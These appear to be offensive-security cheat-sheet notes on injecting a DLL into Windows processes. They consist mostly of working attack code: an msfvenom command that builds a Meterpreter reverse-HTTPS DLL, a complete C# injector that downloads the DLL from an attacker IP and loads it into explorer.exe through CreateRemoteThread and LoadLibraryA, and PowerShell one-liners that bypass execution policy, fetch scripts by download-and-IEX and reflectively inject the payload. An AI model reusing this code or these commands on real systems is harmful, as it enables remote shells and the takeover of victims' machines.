- If you need more functionality than just shellcode - for loading an entire DLL

#### Basic - LoadLibrary Method (.exe):

    //writes .DLL to disk
    //tricking a remote process into loading our DLL - shows in ProcessExplorer
    //the DLL must be C/C++ and be Unmanaged - the one I've built so far has been Managed C#
    //our DLL will execute shellcode when DllMain function is called (w/ the DLL_PROCESS_ATTACH reason code)
    //we manually write our DLL file name/path into the remote process memory, then start a thread at the LoadLibrary function location, passing it the memory address we wrote
    //Fetch our DLL via http, save to disk (LoadLibrary only acts on files), then call LoadLibrary
    //compile and execute as x64

    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f dll -o /var/www/html/met.dll

    using System;
    using System.Diagnostics;
    using System.Net;
    using System.Runtime.InteropServices;
    using System.Text;

    namespace DLLInjection1
    {
        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
            [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName);
            static void Main(string[] args)
            {
                String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                String dllName = dir + "\\met.dll";
                WebClient wc = new WebClient();
                wc.DownloadFile("http://192.168.45.224/met.dll", dllName);
                Process[] expProc = Process.GetProcessesByName("explorer");
                int pid = expProc[0].Id;
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                IntPtr outSize;
                Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            }
        }
    }

#### Invoke-ReflectivePEInjection.ps1:

    //can reflectively load a DLL/EXE into the PowerShell process, or it can reflectively load a DLL into a remote process

    //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f dll -o /var/www/html/met.dll

    //Usage:
        powershell -ep bypass
        $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.224/met.dll'); $procid = (Get-Process -Name explorer).Id
        ##Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
        ##(new-object system.net.WebClient).DownloadString('http://192.168.45.224/Invoke-ReflectivePEInjection.ps1') | IEX
        Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid 
